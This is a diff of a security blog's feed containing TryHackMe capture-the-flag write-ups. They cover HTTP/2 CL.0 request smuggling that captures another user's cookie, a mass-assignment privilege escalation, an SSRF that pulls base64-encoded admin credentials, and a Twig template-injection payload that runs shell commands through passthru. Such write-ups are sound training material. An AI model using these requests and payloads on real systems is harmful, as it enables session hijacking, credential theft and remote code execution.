+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Found issue: CL.0 desync: h2CL|TRACE /
+</span></span><span style="display:flex;"><span>Target: https://10.10.192.13
+</span></span><span style="display:flex;"><span>HTTP Request Smuggler repeatedly issued the attached request. After 1 attempts, it got a response that appears to have been poisoned by the body of the previous request. For further details and information on remediation, please refer to https://portswigger.net/research/browser-powered-desync-attacks
+</span></span><span style="display:flex;"><span>Evidence: 
+</span></span><span style="display:flex;"><span>...SNIP...
+</span></span></code></pre></div><p>The extension found vulnerability using <code>Content-Length: 0</code> header (CL.0). I crafted a request to save next user request as a chat message:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#89b4fa">POST</span> <span style="color:#fab387">/send_message</span> <span style="color:#cba6f7">HTTP</span><span style="color:#89dceb;font-weight:bold">/</span><span style="color:#fab387">2</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#89dceb;font-weight:bold">:</span> MACHINE_IP:80
+</span></span><span style="display:flex;"><span>Cookie<span style="color:#89dceb;font-weight:bold">:</span> session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.Z8tq_Q.gQXcvleCNmEbgOtBufFKNugsIP4
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#89dceb;font-weight:bold">:</span> Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+</span></span><span style="display:flex;"><span>Accept<span style="color:#89dceb;font-weight:bold">:</span> */*
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#89dceb;font-weight:bold">:</span> en-US,en;q=0.5
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#89dceb;font-weight:bold">:</span> gzip, deflate, br
+</span></span><span style="display:flex;"><span>Referer<span style="color:#89dceb;font-weight:bold">:</span> https://MACHINE_IP:80/messages
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#89dceb;font-weight:bold">:</span> application/x-www-form-urlencoded
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#89dceb;font-weight:bold">:</span> 0
+</span></span><span style="display:flex;"><span>Origin<span style="color:#89dceb;font-weight:bold">:</span> https://MACHINE_IP:80
+</span></span><span style="display:flex;"><span>Sec-Fetch-Dest<span style="color:#89dceb;font-weight:bold">:</span> empty
+</span></span><span style="display:flex;"><span>Sec-Fetch-Mode<span style="color:#89dceb;font-weight:bold">:</span> cors
+</span></span><span style="display:flex;"><span>Sec-Fetch-Site<span style="color:#89dceb;font-weight:bold">:</span> same-origin
+</span></span><span style="display:flex;"><span>Priority<span style="color:#89dceb;font-weight:bold">:</span> u=0
+</span></span><span style="display:flex;"><span>Te<span style="color:#89dceb;font-weight:bold">:</span> trailers
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>POST /send_message HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: MACHINE_IP:80
+</span></span><span style="display:flex;"><span>Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.Z8tq_Q.gQXcvleCNmEbgOtBufFKNugsIP4
+</span></span><span style="display:flex;"><span>Content-Type: application/x-www-form-urlencoded
+</span></span><span style="display:flex;"><span>Content-Length: 700
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>data=
+</span></span></code></pre></div><p>After playing a bit with smuggled request&rsquo;s <code>Content-Size</code> I got a user request containing the second flag as a cookie value:</p>
+<div class="tabs">
+<input type="radio" class="toggle" name="tabs-4" id="tabs-4-0" checked="checked" />
+<label for="tabs-4-0">Request</label>
+<div class="tabs-content"><div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#89b4fa">GET</span> <span style="color:#fab387">/getMessages</span> <span style="color:#cba6f7">HTTP</span><span style="color:#89dceb;font-weight:bold">/</span><span style="color:#fab387">2</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#89dceb;font-weight:bold">:</span> MACHINE_IP:80
+</span></span><span style="display:flex;"><span>Cookie<span style="color:#89dceb;font-weight:bold">:</span> session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.Z8tq_Q.gQXcvleCNmEbgOtBufFKNugsIP4
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#89dceb;font-weight:bold">:</span> Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+</span></span><span style="display:flex;"><span>Accept<span style="color:#89dceb;font-weight:bold">:</span> */*
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#89dceb;font-weight:bold">:</span> en-US,en;q=0.5
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#89dceb;font-weight:bold">:</span> gzip, deflate, br
+</span></span><span style="display:flex;"><span>Referer<span style="color:#89dceb;font-weight:bold">:</span> https://MACHINE_IP:80/messages
+</span></span><span style="display:flex;"><span>Sec-Fetch-Dest<span style="color:#89dceb;font-weight:bold">:</span> empty
+</span></span><span style="display:flex;"><span>Sec-Fetch-Mode<span style="color:#89dceb;font-weight:bold">:</span> cors
+</span></span><span style="display:flex;"><span>Sec-Fetch-Site<span style="color:#89dceb;font-weight:bold">:</span> same-origin
+</span></span><span style="display:flex;"><span>Priority<span style="color:#89dceb;font-weight:bold">:</span> u=4
+</span></span><span style="display:flex;"><span>Te<span style="color:#89dceb;font-weight:bold">:</span> trailers
+</span></span></code></pre></div></div>
+<input type="radio" class="toggle" name="tabs-4" id="tabs-4-1"  />
+<label for="tabs-4-1">Response</label>
+<div class="tabs-content"><div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#cba6f7">HTTP</span><span style="color:#89dceb;font-weight:bold">/</span><span style="color:#fab387">2</span> <span style="color:#fab387">200</span> <span style="color:#fab387">OK</span>
+</span></span><span style="display:flex;"><span>Date<span style="color:#89dceb;font-weight:bold">:</span> Fri, 07 Mar 2025 22:01:08 GMT
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#89dceb;font-weight:bold">:</span> application/json
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#89dceb;font-weight:bold">:</span> 2883
+</span></span><span style="display:flex;"><span>Content-Security-Policy<span style="color:#89dceb;font-weight:bold">:</span> default-src &#39;self&#39;; script-src &#39;self&#39;; object-src &#39;none&#39;;
+</span></span><span style="display:flex;"><span>X-Content-Type-Options<span style="color:#89dceb;font-weight:bold">:</span> nosniff
+</span></span><span style="display:flex;"><span>X-Frame-Options<span style="color:#89dceb;font-weight:bold">:</span> SAMEORIGIN
+</span></span><span style="display:flex;"><span>X-Xss-Protection<span style="color:#89dceb;font-weight:bold">:</span> 1; mode=block
+</span></span><span style="display:flex;"><span>Feature-Policy<span style="color:#89dceb;font-weight:bold">:</span> microphone &#39;none&#39;; geolocation &#39;none&#39;;
+</span></span><span style="display:flex;"><span>Age<span style="color:#89dceb;font-weight:bold">:</span> 0
+</span></span><span style="display:flex;"><span>Server<span style="color:#89dceb;font-weight:bold">:</span> El Bandito Server
+</span></span><span style="display:flex;"><span>Accept-Ranges<span style="color:#89dceb;font-weight:bold">:</span> bytes
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{<span style="color:#cba6f7">&#34;JACK&#34;</span>:[<span style="color:#a6e3a1">&#34;The Galactic Enforcement&#39;s quantum sniffers are onto us, tracing our blockchain exploits.&#34;</span>,<span style="color:#a6e3a1">&#34;They&#39;re using predictive analytics, thinking they&#39;re ahead in a 4D chess game across the blockchain.&#34;</span>,<span style="color:#a6e3a1">&#34;You need to jump now! Awaiting your signal to close the portal.&#34;</span>,<span style="color:#fab387">null</span>,<span style="color:#fab387">null</span>,<span style="color:#a6e3a1">&#34;njk&#34;</span>,<span style="color:#fab387">null</span>,<span style="color:#f38ba8">...SNIP...</span><span style="color:#a6e3a1">&#34;GET /access HTTP/1.1\r\nhost: bandito.public.thm:80\r\nscheme: https\r\nsec-ch-ua: \&#34;Chromium\&#34;;v=\&#34;122\&#34;, \&#34;Not(A:Brand\&#34;;v=\&#34;24\&#34;, \&#34;HeadlessChrome\&#34;;v=\&#34;122\&#34;\r\nsec-ch-ua-mobile: ?0\r\nsec-ch-ua-platform: \&#34;Linux\&#34;\r\nupgrade-insecure-requests: 1\r\nuser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/122.0.6261.128 Safari/537.36\r\naccept: text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nsec-fetch-site: none\r\nsec-fetch-mode: navigate\r\nsec-fetch-user: ?1\r\nsec-fetch-dest: document\r\naccept-encoding: gzip, deflate, br\r\ncookie: flag=THM{\u00a1!\u00a1REDACTED!\u00a1!}\r\nX-Forwa&#34;</span>,<span style="color:#fab387">null</span>],<span style="color:#cba6f7">&#34;OLIVER&#34;</span>:[]}
+</span></span></code></pre></div></div>
+</div>
+<div class="callout note">
+    <p>You might need to try several times. HTTP smuggling isn&rsquo;t precise and can cause service disruption: I had to reboot the machine because the server kept dying.</p>
+</div>
+]]></content>
+  </entry>
   <entry>
     <title>Writeup: TryHackMe Include</title>
     <link rel="alternate" href="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/" hreflang="en"/>
@@ -72,53 +434,17 @@
 </span></span><span style="display:flex;"><span>Service Info: Host:  mail.filepath.lab; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 </span></span></code></pre></div><p>There are lots of open ports: SSH, two web apps, and a mail server.</p>
 <p>The first web app running on port 5000 is a SysMon portal. We need to find a way into it to get the first flag.</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_sysmon_home_hu_7ecbce0bb8a16746.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_sysmon_home.png" alt="Screenshot of SysMon app" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="ctf_include_sysmon_home.png" alt="Screenshot of SysMon app"></p>
 <p>The second web app is running on port 4000.</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_social_login_hu_e42cf2110645c7b5.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_social_login.png" alt="Screenshot of review web app login page" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="ctf_include_social_login.png" alt="Screenshot of review web app login page"></p>
 <p>Here, I almost missed the big &ldquo;Sign In using guest/guest&rdquo; phrase.</p>
 <h2 id="privilege-escalation-via-mass-assignment-vulnerability" >
   <a href="#privilege-escalation-via-mass-assignment-vulnerability">Privilege escalation via mass assignment vulnerability</a>
 </h2>
 <p>Logging in with guest credentials displays several profiles. Current user profile exposes a lot of properties which can be considered <a href="https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/" class="external-link">an excessive data exposure part of BOPLA</a> vulnerability. And there is a form which allows adding new properties.</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_profile_hu_4e915b21c3af1aa6.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_profile.png" alt="Screenshot of user profile" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="ctf_include_profile.png" alt="Screenshot of user profile"></p>
 <p>The form is vulnerable to the BOPLA&rsquo;s mass assignment attack, so I used it to escalate current user privileges to the administrator by changing value of <code>isAdmin</code> property.</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_admin_form_hu_6b6aeed1be95a8f8.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_admin_form.png" alt="Screenshot of the form set to isAdmin and true values" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="ctf_include_admin_form.png" alt="Screenshot of the form set to isAdmin and true values"></p>
 <div class="callout note">
     <p>Some writeups call this prototype pollution vulnerability, which is incorrect: we don&rsquo;t modify object prototype here.</p>
 </div>
@@ -126,16 +452,7 @@
   <a href="#getting-admin-credentials-via-ssrf">Getting admin credentials via SSRF</a>
 </h2>
 <p>After successful privilege escalation, the page has two new links: &ldquo;API&rdquo; and &ldquo;Settings&rdquo;.</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_profile_admin_hu_d11050bef3205cc.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_profile_admin.png" alt="Screenshot of the page with new links" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="ctf_include_profile_admin.png" alt="Screenshot of the page with new links"></p>
 <p>On &ldquo;API&rdquo; page there is information about how to access internal APIs; one endpoint allows getting administrator credentials.</p>
 <div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>API Dashboard
 </span></span><span style="display:flex;"><span>
@@ -165,38 +482,11 @@
 </span></span><span style="display:flex;"><span>    &#34;SysMonAppPassword&#34;: &#34;xxxxxxxxx&#34;,
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>&ldquo;Settings&rdquo; page allows changing banner image by providing URL.</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_admin_settings_hu_6407b337f74ec0d7.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_admin_settings.png" alt="Screeenshot of Admin Settings page" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="ctf_include_admin_settings.png" alt="Screeenshot of Admin Settings page"></p>
 <p>This page is vulnerable to SSRF attack. Instead of image URL I provided credentials endpoint:</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_banner_ssrf_hu_f934859fcb0b1717.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_banner_ssrf.png" alt="Screenshot of form set to credentials API url" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="ctf_include_banner_ssrf.png" alt="Screenshot of form set to credentials API url"></p>
 <p>The page includes the response in base64 encoded format:</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_ssrf_response_hu_532fb32eb84fa139.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_ssrf_response.png" alt="Screenshot of the page displaying result of SSRF" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="ctf_include_ssrf_response.png" alt="Screenshot of the page displaying result of SSRF"></p>
 <p>I used CyberChef to decode it:</p>
 <div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>data:application/json; charset=utf-8;base64,eyJSZXZpZXdBcHBVc2VybmFtZSI6ImFkbWluIiwiUmV2aWV3QXBwUGFzc3dvcmQiOiJhZG1pbkAhISEiLCJTeXNNb25BcHBVc2VybmFtZSI6ImFkbWluaXN0cmF0b3IiLCJTeXNNb25BcHBQYXNzd29yZCI6IlMkOSRxazZkIyoqTFFVIn0= 
 </span></span><span style="display:flex;"><span>
@@ -207,16 +497,7 @@
   <a href="#first-flag">First flag</a>
 </h2>
 <p>With these credentials I logged into SysMon app and got the first flag.</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_sysmon_dashboard_hu_b25f2afaaf89a65c.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_sysmon_dashboard.png" alt="Screenshot of the dashboard with displayed flag" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="ctf_include_sysmon_dashboard.png" alt="Screenshot of the dashboard with displayed flag"></p>
 <h2 id="lfi2rce-via-log-poisoning" >
   <a href="#lfi2rce-via-log-poisoning">LFI2RCE via log poisoning</a>
 </h2>
@@ -615,16 +896,7 @@
 <div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>{{[&#39;ls flags&#39;,&#34;&#34;]|sort(&#39;passthru&#39;)|join}}
 </span></span></code></pre></div><p>And finally, to get the flag:</p>
 <div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>{{[&#39;cat flags/REDACTED.txt&#39;,&#34;&#34;]|sort(&#39;passthru&#39;)|join}}
-</span></span></code></pre></div><p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2025/02/13/writeup-tryhackme-injectics/dashboard_hu_80df94a38b0d34a6.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2025/02/13/writeup-tryhackme-injectics/dashboard.png" alt="Screenshot of the dashboard with displayed flags" defer>
-	</picture>
-	
-</figure></p>
+</span></span></code></pre></div><p><img src="dashboard.png" alt="Screenshot of the dashboard with displayed flags"></p>
 ]]></content>
   </entry>
   <entry>
